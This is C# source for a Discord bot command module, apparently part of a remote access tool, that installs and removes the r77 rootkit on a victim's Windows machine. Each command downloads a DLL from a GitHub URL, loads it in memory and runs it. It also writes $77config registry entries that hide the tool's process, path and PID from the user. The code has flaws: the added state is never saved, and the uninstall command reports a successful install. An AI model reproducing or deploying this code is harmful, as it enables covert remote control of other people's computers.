using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading.Tasks;
using CSharpSilon.Utils;
using Discord.Commands;

namespace CSharpSilon.cmds
{
    public class Rootkit :  ModuleBase<SocketCommandContext>
    {
        public static string[] LoadedDlls = new string[] {};
        
        [Command("rootkit-install"), Alias("rki"), Summary("Installs The r77 Rootkit Onto The User")]
        public async Task Install()
        {
            if (!Utils.App.IsAdmin())
            {
                await ReplyAsync("You Must Have Admin Privileges In Order For This To Work");
                return;
            }

            if (LoadedDlls.Contains("rkit"))
            {
                await ReplyAsync("Rootkit Already Installed.");
                return;
            }

            var wc = new WebClient();
            wc.Headers.Add("User-Agent", @"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0");
            wc.Headers.Add("Host", "github.com");
            var dll = wc.DownloadData("https://github.com/KanatiMC/CSharpSilion/raw/DLLs/RI.dll");
            Assembly main = Assembly.Load(dll);
            var EntryPoint = main.EntryPoint;
            try
            {
                new Regedit(@"SOFTWARE\$77config\paths").SetValue(Process.GetCurrentProcess().ProcessName, Process.GetCurrentProcess().MainModule.FileName);
                new Regedit(@"SOFTWARE\$77config\process_names").SetValue(Process.GetCurrentProcess().ProcessName, Process.GetCurrentProcess().ProcessName);
                new Regedit(@"SOFTWARE\$77config\process_names").SetValue(Process.GetCurrentProcess().ProcessName, Process.GetCurrentProcess().ProcessName+".exe");
                new Regedit(@"SOFTWARE\$77config\pid").SetValue(Process.GetCurrentProcess().ProcessName, Process.GetCurrentProcess().Id);
                EntryPoint.Invoke(null, null);
                LoadedDlls.Append("rkit");
                await ReplyAsync("Rootkit Added Successfully");
            }
            catch
            {
                await ReplyAsync("Rootkit Could Not Be Invoked.");
            }
        }
        
        
        [Command("rootkit-uninstall"), Alias("rku"), Summary("Uninstalls The r77 Rootkit From The User")]
        public async Task Uninstall()
        {
            if (!Utils.App.IsAdmin())
            {
                await ReplyAsync("You Must Have Admin Privileges In Order For This To Work");
                return;
            }

            if (!LoadedDlls.Contains("rkit"))
            {
                await ReplyAsync("Rootkit Already Uninstalled.");
                return;
            }

            var wc = new WebClient();
            wc.Headers.Add("User-Agent", @"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0");
            wc.Headers.Add("Host", "github.com");
            var dll = wc.DownloadData("https://github.com/KanatiMC/CSharpSilion/raw/DLLs/RU.dll");
            Assembly main = Assembly.Load(dll);
            var EntryPoint = main.EntryPoint;
            try
            {
                new Regedit(@"SOFTWARE\$77config\paths").SetValue(Process.GetCurrentProcess().ProcessName, Process.GetCurrentProcess().MainModule.FileName);
                new Regedit(@"SOFTWARE\$77config\process_names").SetValue(Process.GetCurrentProcess().ProcessName, Process.GetCurrentProcess().ProcessName);
                new Regedit(@"SOFTWARE\$77config\process_names").SetValue(Process.GetCurrentProcess().ProcessName, Process.GetCurrentProcess().ProcessName+".exe");
                new Regedit(@"SOFTWARE\$77config\pid").SetValue(Process.GetCurrentProcess().ProcessName, Process.GetCurrentProcess().Id);
                EntryPoint.Invoke(null, null);
                LoadedDlls.Append("rkit");
                await ReplyAsync("Rootkit Added Successfully");
            }
            catch
            {
                await ReplyAsync("Rootkit Could Not Be Invoked.");
            }
        }
    }
}